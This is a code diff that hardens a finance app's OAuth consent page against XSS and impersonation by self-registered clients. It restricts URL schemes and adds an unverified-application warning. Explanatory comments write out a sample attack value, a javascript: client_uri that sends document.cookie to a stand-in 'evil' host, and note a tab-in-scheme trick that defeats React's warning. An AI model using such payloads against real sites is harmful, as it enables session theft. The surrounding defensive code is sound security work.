@@ -1,3 +1,4 @@
+import { isTrustedClientId } from "@cobalt-web/auth/trusted-clients";
 import { env } from "@cobalt-web/env/web";
 import { Alert, AlertDescription, AlertTitle } from "@cobalt-web/ui/components/alert";
 import { Button } from "@cobalt-web/ui/components/button";
@@ -21,6 +22,38 @@ export const Route = createFileRoute("/oauth/consent")({
   staticData: { title: "Authorize application" },
 });
 
+/**
+ * Parses an attacker-controllable URL string and returns the canonical
+ * `https:` form, or `null` if parsing fails or the scheme is anything else.
+ *
+ * OAuth dynamic client registration is open + unauthenticated (see
+ * `packages/auth/src/index.ts`: `allowUnauthenticatedClientRegistration`).
+ * Anyone on the internet can register a client with
+ * `client_uri: "javascript:fetch('https://evil/x?c='+document.cookie)"`,
+ * craft an `/oauth/consent?client_id=…` URL, and trick a victim into
+ * clicking the rendered link — XSS in the `cobaltpf.com` origin with the
+ * authenticated finance-API session. React does NOT sanitize `href`
+ * attributes (the dev-only `javascript:` warning is a substring check
+ * defeated by `java\tscript:`), so the React layer cannot be trusted to
+ * filter these.
+ *
+ * Allow `https:` only. OAuth 2.1 §1.5 requires HTTPS for AS endpoints,
+ * and the MCP 2025-11-25 spec requires HTTPS for `client_id` metadata
+ * URLs under CIMD. There is no production case for a plaintext-`http:`
+ * `client_uri` / `logo_uri` / `tos_uri` / `policy_uri`.
+ */
+function safeHttpsUrl(raw: string | null | undefined): string | null {
+  if (!raw) {
+    return null;
+  }
+  try {
+    const u = new URL(raw);
+    return u.protocol === "https:" ? u.href : null;
+  } catch {
+    return null;
+  }
+}
+
 /** Better Auth returns `{ redirect, url }`; OpenAPI documents `redirect_uri`. */
 function pickRedirectUrlFromConsentResponse(data: unknown): string | null {
   if (!data || typeof data !== "object") {
@@ -43,11 +76,59 @@ function pickRedirectUrlFromConsentResponse(data: unknown): string | null {
 }
 
 /**
+ * Allowed schemes for post-consent redirect. `https:` covers web OAuth
+ * clients; the custom schemes cover known MCP host applications that
+ * register app-launch redirect URIs. Explicitly excludes `javascript:`,
+ * `data:`, `vbscript:`, `file:` — `assign()` on any of those executes
+ * script in the cobaltpf.com origin.
+ *
+ * `http:` is also allowed but **only** for loopback hosts (`localhost`,
+ * `127.0.0.1`, `::1`) because RFC 8252 §7.3 requires localhost OAuth
+ * loopback to use `http:` and MCP clients (Claude Code, Claude Desktop,
+ * mcp-remote) register local redirect URIs this way.
+ *
+ * Custom schemes are added only after observing a real client use them.
+ * Speculative schemes (`zed:`, `claude:`, `code:`) were removed because
+ * we cannot confirm any production client registers them.
+ */
+const ALLOWED_REDIRECT_SCHEMES = new Set(["https:", "cursor:", "vscode:"]);
+
+function isLocalhostHost(host: string): boolean {
+  const [h] = host.toLowerCase().split(":");
+  return h === "localhost" || h === "127.0.0.1" || h === "[::1]" || h === "::1";
+}
+
+function isAllowedRedirectUrl(raw: string): boolean {
+  try {
+    const u = new URL(raw);
+    if (ALLOWED_REDIRECT_SCHEMES.has(u.protocol)) {
+      return true;
+    }
+    if (u.protocol === "http:" && isLocalhostHost(u.host)) {
+      return true;
+    }
+    return false;
+  } catch {
+    return false;
+  }
+}
+
+/**
  * After `await fetch()`, user activation is gone; many browsers block
  * `window.location` to custom schemes (e.g. `cursor://`). We still try
  * assign/replace, and always show a same-document `<a href>` fallback.
+ *
+ * The URL ultimately derives from an OAuth client's registered redirect
+ * URI. With unauthenticated dynamic client registration enabled
+ * (`packages/auth/src/index.ts`), an attacker could register
+ * `redirect_uri: "javascript:..."` and obtain XSS on Allow without the
+ * victim clicking anything. Validate scheme defensively here even though
+ * Better Auth should reject dangerous schemes at registration.
  */
 function tryNavigateToClient(url: string): void {
+  if (!isAllowedRedirectUrl(url)) {
+    return;
+  }
   try {
     window.location.assign(url);
   } catch {
@@ -64,16 +145,17 @@ const IDENTITY_SCOPE_LABELS: Record<string, string> = {
 
 const IDENTITY_SCOPES = new Set(Object.keys(IDENTITY_SCOPE_LABELS));
 
-const COBALT_SCOPE_LABELS: Record<string, string> = {
-  "cobalt:read": "Read your accounts, transactions, and holdings",
-  "cobalt:write": "Edit transaction tags, categories, and notes",
-};
-
 /**
- * Capabilities the access token can never grant, surfaced as explicit
- * negatives so users see the boundary, not just what was approved. Kept in
- * sync with `cobalt.*` SDK in apps/server/src/ai/agents/finance-agent/sdk-description.ts.
+ * Capabilities the access token grants on the data side, surfaced so users
+ * understand what an MCP client can do. The token doesn't carry per-resource
+ * scopes today — bearer = full read + tag/category writes. Kept in sync with
+ * `cobalt.*` SDK in apps/server/src/ai/agents/finance-agent/sdk-description.ts.
  */
+const COBALT_CAPABILITIES = [
+  "Read your accounts, transactions, and holdings",
+  "Edit transaction tags, categories, and notes",
+] as const;
+
 const COBALT_NEGATIVE_CAPABILITIES = [
   "Cannot move money or change account connections",
   "Cannot access your chats",
@@ -109,54 +191,61 @@ function ClientCard({
   isPending: boolean;
   client: PublicClient | null;
 }) {
+  // Trust tier gates which fields render. Verified clients are pre-blessed
+  // first-party apps (`packages/auth/src/trusted-clients.ts`). Untrusted =
+  // anyone who self-registered via open DCR — we cannot trust their
+  // client_name or logo for branding, so we render a generic icon and a
+  // warning banner instead (SRI-340).
+  const isVerified = isTrustedClientId(clientId);
   const displayName = client?.client_name?.trim() || clientId;
   const initial = displayName.slice(0, 1).toUpperCase();
+  const safeLogo = isVerified ? safeHttpsUrl(client?.logo_uri) : null;
+  // For verified clients we still show client_uri as a hostname (never a
+  // clickable link). For unverified clients we drop it entirely — the
+  // hostname is one of the strings an attacker controls at registration
+  // time, so even displaying it as text aids brand impersonation.
+  const clientHost = (() => {
+    if (!isVerified) {
+      return null;
+    }
+    const safe = safeHttpsUrl(client?.client_uri);
+    if (!safe) {
+      return null;
+    }
+    try {
+      return new URL(safe).host;
+    } catch {
+      return null;
+    }
+  })();
   return (
     <div className="bg-muted/50 ring-foreground/10 flex items-center gap-3 rounded-lg p-3 ring-1">
       <div className="bg-background ring-foreground/10 flex size-9 shrink-0 items-center justify-center overflow-hidden rounded-md ring-1">
-        {client?.logo_uri ? (
-          <img alt="" className="size-full object-cover" src={client.logo_uri} />
+        {safeLogo ? (
+          <img alt="" className="size-full object-cover" src={safeLogo} />
         ) : (
           <span className="font-medium text-sm">{initial}</span>
         )}
       </div>
       <div className="min-w-0 flex-1">
-        <p className="text-muted-foreground text-xs">Application</p>
+        <p className="text-muted-foreground text-xs">
+          {isVerified ? "Verified application" : "Unverified application"}
+        </p>
         {isPending ? (
           <p className="bg-muted h-4 w-32 animate-pulse rounded" />
         ) : (
           <p className="truncate font-medium text-sm">{displayName}</p>
         )}
-        {client?.client_uri ? (
-          <a
-            className="text-muted-foreground block truncate text-xs underline-offset-4 hover:underline"
-            href={client.client_uri}
-            rel="noreferrer"
-            target="_blank"
-          >
-            {client.client_uri}
-          </a>
+        {clientHost ? (
+          <p className="text-muted-foreground block truncate text-xs">{clientHost}</p>
         ) : null}
       </div>
     </div>
   );
 }
 
-function partitionScopes(scopes: string[]): { identity: string[]; cobalt: string[] } {
-  const identity: string[] = [];
-  const cobalt: string[] = [];
-  for (const scope of scopes) {
-    if (IDENTITY_SCOPES.has(scope)) {
-      identity.push(scope);
-    } else if (COBALT_SCOPE_LABELS[scope]) {
-      cobalt.push(scope);
-    }
-  }
-  return { cobalt, identity };
-}
-
 function ScopeList({ scopes }: { scopes: string[] }) {
-  const { identity, cobalt } = partitionScopes(scopes);
+  const identity = scopes.filter((s) => IDENTITY_SCOPES.has(s));
   return (
     <div className="space-y-4">
       {identity.length > 0 ? (
@@ -186,17 +275,14 @@ function ScopeList({ scopes }: { scopes: string[] }) {
           Cobalt data
         </p>
         <ul className="space-y-2">
-          {cobalt.map((scope) => (
-            <li className="flex items-start gap-2 text-sm" key={scope}>
+          {COBALT_CAPABILITIES.map((label) => (
+            <li className="flex items-start gap-2 text-sm" key={label}>
               <HugeiconsIcon
                 className="text-foreground/70 mt-0.5 shrink-0"
                 icon={CheckmarkCircle02Icon}
                 size={16}
               />
-              <div className="min-w-0">
-                <span>{COBALT_SCOPE_LABELS[scope]}</span>
-                <code className="text-muted-foreground ml-1.5 text-xs">{scope}</code>
-              </div>
+              <span className="min-w-0">{label}</span>
             </li>
           ))}
           {COBALT_NEGATIVE_CAPABILITIES.map((label) => (
@@ -220,7 +306,7 @@ function RouteComponent() {
   /** Which action is in flight — drives the post-click message before redirect. */
   const [pendingIntent, setPendingIntent] = useState<"allow" | "deny" | null>(null);
   /** Set when consent API succeeded; used for reliable `cursor://` handoff. */
-  const [_redirectUrl, setRedirectUrl] = useState<string | null>(null);
+  const [redirectUrl, setRedirectUrl] = useState<string | null>(null);
   const [completedIntent, setCompletedIntent] = useState<"allow" | "deny" | null>(null);
   const [errorMessage, setErrorMessage] = useState<string | null>(null);
 
@@ -358,6 +444,18 @@ function RouteComponent() {
               <ClientCard client={client} clientId={clientId} isPending={clientQuery.isPending} />
             ) : null}
 
+            {clientId && !isTrustedClientId(clientId) ? (
+              <Alert variant="destructive">
+                <HugeiconsIcon icon={Alert02Icon} size={16} />
+                <AlertTitle>Unverified application</AlertTitle>
+                <AlertDescription>
+                  This app registered itself with Cobalt and has not been verified by us. Its name,
+                  logo, and website may be misleading. Only continue if you initiated this request
+                  from a tool you trust.
+                </AlertDescription>
+              </Alert>
+            ) : null}
+
             <ScopeList scopes={scopes} />
 
             <Separator />
@@ -414,6 +512,20 @@ function RouteComponent() {
               {allowButtonLabel()}
             </Button>
           </div>
+
+          {isAllowDone && redirectUrl && isAllowedRedirectUrl(redirectUrl) ? (
+            <p className="text-muted-foreground text-center text-xs">
+              If your app did not open automatically,{" "}
+              <a
+                className="underline underline-offset-4"
+                href={redirectUrl}
+                rel="noreferrer noopener"
+              >
+                click here to return to it
+              </a>
+              .
+            </p>
+          ) : null}
 
           <p className="text-muted-foreground text-center text-xs">
             By continuing you agree to our{" "}
